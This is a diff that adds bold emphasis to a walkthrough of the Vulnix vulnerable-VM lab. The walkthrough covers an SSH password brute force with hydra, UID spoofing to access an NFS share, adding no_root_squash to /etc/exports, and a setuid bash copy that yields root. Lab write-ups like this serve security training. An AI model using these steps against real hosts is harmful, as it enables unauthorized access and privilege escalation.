@@ -120,7 +120,7 @@ kali@kali:~$ hydra -l user -P rockyou.txt 192.168.1.100 ssh -t 4
 >[STATUS] 64.00 tries/min, 64 tries in 00:01h, 14344335 to do in 3735:31h, 4 active  
 >[STATUS] 60.67 tries/min, 182 tries in 00:03h, 14344217 to do in 3940:44h, 4 active  
 >[STATUS] 60.57 tries/min, 424 tries in 00:07h, 14343975 to do in 3946:51h, 4 active  
->[22][ssh] host: 192.168.1.100   login: user   password: letmein  
+>[22][ssh] host: 192.168.1.100   login: **user**   password: **letmein**  
 >1 of 1 target successfully completed, 1 valid password found  
 >Hydra (http://www.thc.org/thc-hydra) finished at 2018-03-10 15:47:27
 
@@ -130,14 +130,14 @@ kali@kali:~$ root -l user 192.168.1.100
 
 user@vulnix:~$ cat /etc/passwd
 >root: x:0:0:root:/root:/bin/bash  
->vulnix: x:2008:2008::/home/vulnix:/bin/bash
+>vulnix: x:**2008**:**2008**::/home/vulnix:/bin/bash
 
 
 ### ACCESS TO NFS
 
-root@kali:/home/kali# groupadd vulnix -g 2008
+root@kali:/home/kali# groupadd vulnix -g **2008**
 
-root@kali:/home/kali# useradd vulnix -u 2008 -g 2008 -s /bin/bash
+root@kali:/home/kali# useradd vulnix -u **2008** -g **2008** -s /bin/bash
 
 root@kali:/home/kali# mkdir /home/vulnix
 
@@ -186,7 +186,7 @@ vulnix@vulnix:~$ sudo -l
 vulnix@vulnix:~$ sudoedit /etc/exports
 
 >/home/vulnix    *(rw,root_squash)  
->/root   *(rw,no_root_squash) <- ADDED
+>/root   *(rw,**no_root_squash**) <- ADDED
 
 **Reboot!**
 
@@ -214,7 +214,7 @@ root@kali:/mnt/root# cat trophy.txt
 
 vulnix@vulnix:~$ sudoedit /etc/exports
 
->/home/vulnix    *(rw,no_root_squash) <- MODIFIED  
+>/home/vulnix    *(rw,**no_root_squash**) <- MODIFIED  
 >/root   *(rw,no_root_squash)
 
 **Reboot!**
@@ -225,10 +225,10 @@ root@kali:/mnt/vulnix# chmod 4777 bash
 
 root@kali:/mnt/vulnix# ls -lrth
 >total 900K  
->-rwsrwxrwx 1 root root 900K Mar 10 16:47 bash
+>-rw**s**rwxrwx 1 root root 900K Mar 10 16:47 bash
 
 vulnix@vulnix:~$ ./bash -p
 
 bash-4.2# id
 
->uid=2008(vulnix) gid=2008(vulnix) euid=0(root) groups=0(root),2008(vulnix)
+>uid=2008(vulnix) gid=2008(vulnix) euid=0(**root**) groups=0(**root**),2008(vulnix)
